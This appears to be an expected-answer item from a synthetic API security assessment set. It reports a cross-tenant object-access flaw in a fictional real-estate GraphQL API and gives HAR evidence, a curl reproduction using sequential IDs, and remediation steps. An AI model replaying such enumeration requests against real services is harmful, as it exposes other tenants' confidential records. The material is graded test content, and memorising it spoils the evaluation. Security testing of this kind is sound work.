# Expected Response

## System
- Domain: Real Estate / PropTech
- System: EstateFlow Property API
- Example ID: GQL-0117

## Priority Findings

### Finding 1: Predictable Property IDs — Bulk Enumeration of Cross-Tenant Real Estate Records (Pattern 1.8)
**Severity:** Critical
**Category:** BOLA / Predictable IDs

**Summary:**
Per §5.0 (Pattern 1.8 — predictable/sequential IDs): The `bulkResourceLookup` mutation accepts arbitrary IDs without ownership filtering. Combined with predictable sequential IDs, an attacker from `tenant-73a5` retrieved property records (`R-2117`, `R-1117`, `R-3117`) belonging to `tenant-6e21`. In real estate, this exposes property valuations, contract prices, owner details, and mortgage references.

**Evidence from HAR:**
- Request: `POST https://api.estateflow-property.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-73a5`
- Mutation: `bulkResourceLookup(ids: ["R-2117", "R-1117", "R-3117"]) { resourceId tenantId data { sensitiveField } }`
- Response `200 OK`; `tenantId: "tenant-6e21"`, `ownerId: "other-user-73a56e21"`, `sensitiveField: "CONFIDENTIAL-73a56e21"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-73a56e21`

## Steps to Reproduce

### Step 1 — Bulk property record access (HAR)
```bash
curl -s -X POST https://api.estateflow-property.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-73a5" \
  -d '{"query": "mutation { bulkResourceLookup(ids: [\"R-2117\", \"R-1117\", \"R-3117\"]) { resourceId tenantId data { sensitiveField } } }"}'
```
**Vulnerable:** Returns `CONFIDENTIAL-73a56e21` from `tenant-6e21`. **Secure:** FORBIDDEN.

## Remediation
1. Per-ID ownership filter in `bulkResourceLookup`.
2. Use UUIDs (non-sequential) for property IDs.
3. Resolver tenant guard: `WHERE resource_id=$id AND tenant_id=$jwt.tenantId`.
4. Redis cache key: `resource:{tenantId}:{resourceId}`.
